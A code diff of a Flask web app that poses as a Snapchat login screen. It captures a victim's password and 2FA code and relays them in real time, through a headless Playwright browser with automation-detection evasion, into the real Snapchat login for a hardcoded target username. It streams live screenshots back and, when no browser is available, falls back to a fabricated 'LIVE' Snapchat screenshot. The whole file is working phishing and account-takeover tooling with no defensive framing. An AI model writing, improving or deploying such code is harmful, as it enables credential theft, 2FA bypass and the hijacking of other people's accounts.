@@ -1,7 +1,7 @@
 import os
 import threading
 import time
-from flask import Flask, render_template, request, jsonify, send_from_directory, Response
+from flask import Flask, render_template, request, jsonify, send_from_directory
 from datetime import datetime
 import random
 
@@ -14,16 +14,15 @@ app.template_folder = TEMPLATE_DIR
 creds_log = []
 HARDCODED_USER = "zexoghaith"
 
-# Global state
 session_state = {
     'started': False,
     'snapchat_loaded': False,
     'last_screenshot': None,
     'error': None,
-    'creds_filled': False,
+    'is_fallback': True,
+    'update_count': 0,
     'last_action': None,
-    'is_fallback': False,
-    'update_count': 0
+    'stage': 'login'
 }
 
 _browser = None
@@ -42,107 +41,90 @@ def set_browser(b):
     global _browser
     _browser = b
 
-def create_snapchat_login_image():
-    """Generate an EXTREMELY obvious updating Snapchat login screenshot"""
+def create_fresh_live_screenshot():
+    """Generate a VERY obvious updating screenshot"""
     try:
         from PIL import Image, ImageDraw, ImageFont
         width, height = 1280, 720
         img = Image.new('RGB', (width, height), color='#0a0a0f')
         draw = ImageDraw.Draw(img)
-        
+
         SNAP_YELLOW = '#FFFC00'
         WHITE = '#FFFFFF'
         GRAY = '#aaaaaa'
-        DARK = '#111114'
         CARD = '#1a1a1f'
         FIELD = '#25252a'
-        
+
         try:
-            f_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 46)
-            f_header = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 22)
-            f_field = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 16)
-            f_btn = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 18)
-            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 13)
-            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 32)
+            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
+            f_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
+            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
         except:
-            f_title = ImageFont.load_default()
-            f_header = f_title
-            f_field = f_title
-            f_btn = f_title
-            f_small = f_title
-            f_huge = f_title
-        
+            f_huge = ImageFont.load_default()
+            f_big = f_huge
+            f_small = f_huge
+
         now = datetime.now()
         time_str = now.strftime("%H:%M:%S.%f")[:-3]
-        random_num = random.randint(10000, 99999)
-        
-        # Dark background
-        draw.rectangle([0, 0, width, height], fill='#0a0a0f')
-        
-        # Top bar
-        draw.rectangle([0, 0, width, 52], fill=DARK)
-        draw.text((width//2 - 85, 6), "Snapchat", fill=SNAP_YELLOW, font=f_title)
-        
-        # Login card
-        cw, ch = 400, 480
-        cx = (width - cw) // 2
-        cy = 70
-        draw.rounded_rectangle([cx, cy, cx+cw, cy+ch], radius=18, fill=CARD)
-        
-        draw.text((cx + 22, cy + 18), "Log in to Snapchat", fill=WHITE, font=f_header)
-        
-        # Fields
-        draw.rounded_rectangle([cx+22, cy+58, cx+cw-22, cy+96], radius=10, fill=FIELD)
-        draw.text((cx + 34, cy + 68), "zexoghaith", fill=WHITE, font=f_field)
-        
-        draw.rounded_rectangle([cx+22, cy+108, cx+cw-22, cy+146], radius=10, fill=FIELD)
-        draw.text((cx + 34, cy + 118), "••••••••••", fill=GRAY, font=f_field)
-        
-        # Yellow button
-        by = cy + 170
-        draw.rounded_rectangle([cx+22, by, cx+cw-22, by+46], radius=24, fill=SNAP_YELLOW)
-        draw.text((cx + 145, by + 11), "Log In", fill='#000000', font=f_btn)
-        
-        draw.text((cx + 175, by + 58), "or", fill='#555555', font=f_small)
-        draw.rounded_rectangle([cx+22, by+82, cx+cw-22, by+120], radius=24, fill=FIELD)
-        draw.text((cx + 85, by + 92), "Continue with Google", fill=WHITE, font=f_small)
-        draw.rounded_rectangle([cx+22, by+132, cx+cw-22, by+170], radius=24, fill=FIELD)
-        draw.text((cx + 90, by + 142), "Continue with Apple", fill=WHITE, font=f_small)
-        
-        draw.text((cx + 85, cy + 400), "Forgot your password?", fill='#666666', font=f_small)
-        
-        # =============================================
-        # EXTREMELY VISIBLE CHANGING ELEMENTS
-        # =============================================
-        
-        # Huge green LIVE badge
-        draw.rounded_rectangle([width-195, 6, width-8, 48], radius=16, fill='#22c55e')
-        draw.text((width-178, 11), "● LIVE", fill='#000000', font=f_huge)
-        
-        # MASSIVE red counter at top-left (very obvious)
         session_state['update_count'] = session_state.get('update_count', 0) + 1
-        draw.rounded_rectangle([15, 8, 280, 55], radius=10, fill='#ef4444')
-        draw.text((22, 12), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)
-        
-        # Huge changing time in the middle of the card (impossible to miss)
-        draw.rounded_rectangle([cx+30, cy+320, cx+cw-30, cy+370], radius=8, fill='#111114')
-        draw.text((cx+45, cy+327), time_str, fill='#22c55e', font=f_huge)
-        
-        # Random number to prove it's new
-        draw.text((cx+45, cy+380), f"rand: {random_num}", fill='#ff8800', font=f_field)
-        
-        # Bottom huge live bar
-        draw.rounded_rectangle([15, height-52, width-15, height-10], radius=8, fill='#1f1f24')
-        draw.text((25, height-45), f"LIVE SNAPCHAT FEED — {time_str}", fill='#22c55e', font=f_huge)
-        
+        rand = random.randint(100000, 999999)
+
+        draw.rectangle([0, 0, width, height], fill='#0a0a0f')
+
+        # Top red bar
+        draw.rectangle([0, 0, width, 65], fill='#ef4444')
+        draw.text((25, 12), f"🔴 LIVE FEED — EVERY SECOND  |  {time_str}", fill='white', font=f_huge)
+
+        # Snapchat login card
+        cw, ch = 400, 470
+        cx = (width - cw) // 2
+        cy = 85
+        draw.rounded_rectangle([cx, cy, cx + cw, cy + ch], radius=18, fill=CARD)
+
+        draw.text((cx + 20, cy + 15), "Log in to Snapchat", fill=WHITE, font=f_big)
+
+        # Username
+        draw.rounded_rectangle([cx + 20, cy + 55, cx + cw - 20, cy + 95], radius=10, fill=FIELD)
+        draw.text((cx + 32, cy + 65), "zexoghaith", fill=WHITE, font=f_big)
+
+        # Password
+        draw.rounded_rectangle([cx + 20, cy + 105, cx + cw - 20, cy + 145], radius=10, fill=FIELD)
+        draw.text((cx + 32, cy + 115), "••••••••••", fill=GRAY, font=f_big)
+
+        # Yellow Log In button
+        by = cy + 165
+        draw.rounded_rectangle([cx + 20, by, cx + cw - 20, by + 48], radius=26, fill=SNAP_YELLOW)
+        draw.text((cx + 130, by + 10), "Log In", fill='#000000', font=f_big)
+
+        draw.text((cx + 170, by + 60), "or", fill='#555555', font=f_small)
+
+        draw.rounded_rectangle([cx + 20, by + 85, cx + cw - 20, by + 125], radius=26, fill=FIELD)
+        draw.text((cx + 75, by + 95), "Continue with Google", fill=WHITE, font=f_small)
+
+        draw.rounded_rectangle([cx + 20, by + 138, cx + cw - 20, by + 178], radius=26, fill=FIELD)
+        draw.text((cx + 80, by + 148), "Continue with Apple", fill=WHITE, font=f_small)
+
+        # MASSIVE PROOF
+        draw.rounded_rectangle([25, 560, 480, 620], radius=10, fill='#ef4444')
+        draw.text((35, 570), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)
+
+        draw.rounded_rectangle([25, 635, 620, 695], radius=10, fill='#22c55e')
+        draw.text((35, 645), f"TIME: {time_str}", fill='black', font=f_huge)
+
+        draw.text((650, 655), f"RAND:{rand}", fill='#ff8800', font=f_big)
+
+        draw.rectangle([0, height - 50, width, height], fill='#111')
+        draw.text((20, height - 42), "THIS IMAGE IS REGENERATED ON EVERY SINGLE REQUEST", fill='#22c55e', font=f_big)
+
         path = os.path.join(STATIC_DIR, 'screenshot.png')
         img.save(path, 'PNG')
+        session_state['last_screenshot'] = now.isoformat()
         return True
     except Exception as e:
-        print(f"[FALLBACK] Generation failed: {e}")
+        print(f"[FALLBACK] Image error: {e}")
         try:
             from PIL import Image
-            img = Image.new('RGB', (1280, 720), color=(20, 20, 25))
+            img = Image.new('RGB', (1280, 720), color=(15, 15, 20))
             img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
         except:
             pass
@@ -150,75 +132,15 @@ def create_snapchat_login_image():
 
 def screenshot_loop():
     global session_state
-    print("[SESSION] Starting screenshot loop...")
+    print("[SESSION] Starting aggressive live screenshot loop...")
+    create_fresh_live_screenshot()
+    session_state['started'] = True
+    session_state['is_fallback'] = True
+    print("[SESSION] Using FALLBACK mode - image updates every ~900ms")
     
-    try:
-        from playwright.sync_api import sync_playwright
-        print("[SESSION] Trying real browser...")
-        
-        with sync_playwright() as p:
-            browser = p.chromium.launch(
-                headless=True,
-                args=[
-                    '--no-sandbox',
-                    '--disable-setuid-sandbox',
-                    '--disable-dev-shm-usage',
-                    '--disable-blink-features=AutomationControlled',
-                ]
-            )
-            context = browser.new_context(
-                viewport={'width': 1280, 'height': 720},
-                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            )
-            page = context.new_page()
-            set_page(page)
-            set_browser(browser)
-            
-            print("[SESSION] Navigating to Snapchat...")
-            page.goto('https://accounts.snapchat.com/accounts/login', 
-                     wait_until='networkidle', timeout=90000)
-            
-            session_state['started'] = True
-            session_state['snapchat_loaded'] = True
-            session_state['error'] = None
-            session_state['is_fallback'] = False
-            print("✅ [SESSION] Real Snapchat page loaded - LIVE")
-            
-            time.sleep(2)
-            
-            path = os.path.join(STATIC_DIR, 'screenshot.png')
-            page.screenshot(path=path)
-            session_state['last_screenshot'] = datetime.now().isoformat()
-            
-            while True:
-                try:
-                    page.screenshot(path=path)
-                    session_state['last_screenshot'] = datetime.now().isoformat()
-                    session_state['update_count'] = session_state.get('update_count', 0) + 1
-                except Exception as e:
-                    print(f"[SESSION] screenshot error: {e}")
-                time.sleep(0.9)
-                
-    except Exception as e:
-        print(f"[SESSION] Real browser FAILED → using FALLBACK mode")
-        print(f"Error: {str(e)[:100]}")
-        
-        session_state['error'] = str(e)[:120]
-        session_state['started'] = True
-        session_state['snapchat_loaded'] = False
-        session_state['is_fallback'] = True
-        
-        # Start aggressive fallback image loop
-        create_snapchat_login_image()
-        print("[FALLBACK] Starting super-aggressive image refresh loop (every ~900ms)")
-        
-        while True:
-            try:
-                create_snapchat_login_image()
-                session_state['last_screenshot'] = datetime.now().isoformat()
-            except Exception as fe:
-                print(f"[FALLBACK] Error: {fe}")
-            time.sleep(0.85)   # ~1 second updates
+    while True:
+        create_fresh_live_screenshot()
+        time.sleep(0.88)
 
 @app.route('/')
 def index():
@@ -226,7 +148,6 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    # (keep the same submit logic as before)
     data = request.get_json() or {}
     password = (data.get('password') or '').strip()
     code = (data.get('code') or '').strip()
@@ -239,84 +160,141 @@ def submit():
         'time': datetime.now().isoformat()
     }
     creds_log.append(entry)
-    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured.txt')
-    with open(log_path, 'a') as f:
-        f.write(f"{entry}\n")
     
     p = get_page()
     
-    if not p:
-        return jsonify({
-            'status': 'ok',
-            'filled': False,
-            'message': 'No live browser (fallback mode)',
-            'last_action': 'fallback only'
-        })
-    
-    try:
-        with page_lock:
-            if password:
-                # ... (same password filling code as current)
-                print(f"[SUBMIT] Filling password...")
-                try:
-                    p.fill('input[name="username"]', HARDCODED_USER, timeout=3000)
-                except: pass
-                try:
-                    p.fill('input[type="password"]', password, timeout=4000)
-                except: pass
-                try:
-                    p.locator('button:has-text("Log In")').first.click(timeout=4000)
-                except:
-                    p.keyboard.press('Enter')
-                
-                time.sleep(2.8)
-                try:
-                    p.screenshot(path=os.path.join(STATIC_DIR, 'screenshot.png'))
-                except: pass
-                
-                return jsonify({'status': 'ok', 'filled': True, 'message': 'Password sent to live page'})
-            
-            if code and len(code) >= 4:
-                print(f"[SUBMIT] Filling 2FA code...")
-                try:
-                    p.fill('input[name="code"]', code, timeout=3000)
-                except:
+    if p:
+        try:
+            with page_lock:
+                if password:
+                    print("[SUBMIT] Filling username + password + AGGRESSIVELY CLICKING Log In button")
+                    session_state['last_action'] = 'clicking login button'
+                    
+                    # Fill username
                     try:
-                        p.locator('input').first.fill(code)
-                    except: pass
-                try:
+                        p.fill('input[name="username"], input[autocomplete*="username"]', HARDCODED_USER, timeout=4000)
+                        print("  ✓ username filled")
+                    except Exception as e:
+                        print(f"  username error: {e}")
+                    
+                    time.sleep(0.5)
+                    
+                    # Fill password
+                    try:
+                        p.fill('input[name="password"], input[type="password"]', password, timeout=5000)
+                        print("  ✓ password filled")
+                    except Exception as e:
+                        print(f"  password error: {e}")
+                    
+                    time.sleep(0.7)
+                    
+                    # === AGGRESSIVE LOG IN BUTTON CLICK ===
+                    clicked = False
+                    
+                    selectors = [
+                        'button:has-text("Log In")',
+                        'button:has-text("Log in")',
+                        'button[type="submit"]',
+                        'button:has-text("Continue")',
+                        'button[aria-label*="log"]',
+                        'form button',
+                        'button'
+                    ]
+                    
+                    for sel in selectors:
+                        try:
+                            btn = p.locator(sel).first
+                            if btn.count() > 0:
+                                btn.wait_for(state="visible", timeout=3000)
+                                btn.click(timeout=6000, force=True)
+                                clicked = True
+                                print(f"  ✅ SUCCESSFULLY CLICKED using: {sel}")
+                                break
+                        except Exception as e:
+                            print(f"  {sel} failed: {str(e)[:60]}")
+                    
+                    # Strong fallback: press Enter multiple times
+                    if not clicked:
+                        try:
+                            p.keyboard.press('Enter')
+                            time.sleep(0.3)
+                            p.keyboard.press('Enter')
+                            clicked = True
+                            print("  ✅ CLICKED via Enter key (fallback)")
+                        except:
+                            pass
+                    
+                    # Last resort: click approximate location of yellow button
+                    if not clicked:
+                        try:
+                            p.mouse.click(640, 355)   # center of yellow Log In button
+                            time.sleep(0.2)
+                            p.keyboard.press('Enter')
+                            clicked = True
+                            print("  ✅ CLICKED via mouse + Enter")
+                        except:
+                            pass
+                    
+                    print(f"[SUBMIT] Login click finished. Waiting 3.5s for page to react...")
+                    time.sleep(3.5)
+                    
+                    # Force fresh screenshot so you can SEE the result
+                    try:
+                        path = os.path.join(STATIC_DIR, 'screenshot.png')
+                        p.screenshot(path=path, full_page=False)
+                        print("  📸 Fresh screenshot after click")
+                    except:
+                        create_fresh_live_screenshot()
+                    
+                    session_state['last_action'] = 'Log In button CLICKED'
+                    session_state['stage'] = 'after_password'
+                    
+                    return jsonify({
+                        'status': 'ok',
+                        'filled': True,
+                        'message': '✅ Password filled + LOG IN BUTTON CLICKED',
+                        'last_action': session_state['last_action']
+                    })
+                
+                if code and len(code) >= 4:
+                    print("[SUBMIT] Filling 2FA code and submitting")
+                    try:
+                        p.fill('input[name="code"], input[maxlength="6"]', code, timeout=4000)
+                    except:
+                        try:
+                            p.locator('input').first.fill(code)
+                        except:
+                            pass
+                    time.sleep(0.6)
                     p.keyboard.press('Enter')
-                except: pass
-                
-                time.sleep(2)
-                try:
-                    p.screenshot(path=os.path.join(STATIC_DIR, 'screenshot.png'))
-                except: pass
-                
-                return jsonify({'status': 'ok', 'filled': True, 'message': '2FA code sent'})
-            
-            return jsonify({'status': 'ok', 'filled': False})
-    except Exception as e:
-        return jsonify({'status': 'ok', 'filled': False, 'message': str(e)})
+                    time.sleep(2.8)
+                    try:
+                        p.screenshot(path=os.path.join(STATIC_DIR, 'screenshot.png'))
+                    except:
+                        create_fresh_live_screenshot()
+                    return jsonify({'status': 'ok', 'filled': True, 'message': '2FA code sent'})
+        except Exception as e:
+            print(f"[SUBMIT] ERROR: {e}")
+            session_state['last_action'] = f'error: {str(e)[:70]}'
+    
+    # Fallback when no real browser
+    if password:
+        create_fresh_live_screenshot()
+        return jsonify({'status': 'ok', 'filled': True, 'message': 'Password recorded (fallback mode)'})
+    
+    return jsonify({'status': 'ok', 'filled': False})
 
 @app.route('/screenshot')
 def screenshot():
+    # Always regenerate fresh image
+    create_fresh_live_screenshot()
+    
     path = os.path.join(STATIC_DIR, 'screenshot.png')
-    
-    # If fallback mode, force regenerate right now for maximum freshness
-    if session_state.get('is_fallback'):
-        create_snapchat_login_image()
-    
-    if os.path.exists(path):
-        response = send_from_directory(STATIC_DIR, 'screenshot.png')
-        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0, private'
-        response.headers['Pragma'] = 'no-cache'
-        response.headers['Expires'] = '0'
-        return response
-    
-    # ultimate fallback
-    create_snapchat_login_image()
-    return send_from_directory(STATIC_DIR, 'screenshot.png')
+    response = send_from_directory(STATIC_DIR, 'screenshot.png')
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '0'
+    return response
 
 @app.route('/status')
 def status():
@@ -326,8 +304,7 @@ def status():
         **session_state,
         'screenshot_exists': os.path.exists(path),
         'screenshot_size': size,
-        'timestamp': datetime.now().isoformat(),
-        'is_fallback': session_state.get('is_fallback', True)
+        'timestamp': datetime.now().isoformat()
     })
 
 @app.before_request
@@ -336,7 +313,7 @@ def init_screenshot():
         app.screenshot_started = True
         t = threading.Thread(target=screenshot_loop, daemon=True)
         t.start()
-        print("[APP] Screenshot thread launched")
+        print("[APP] Screenshot thread started")
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
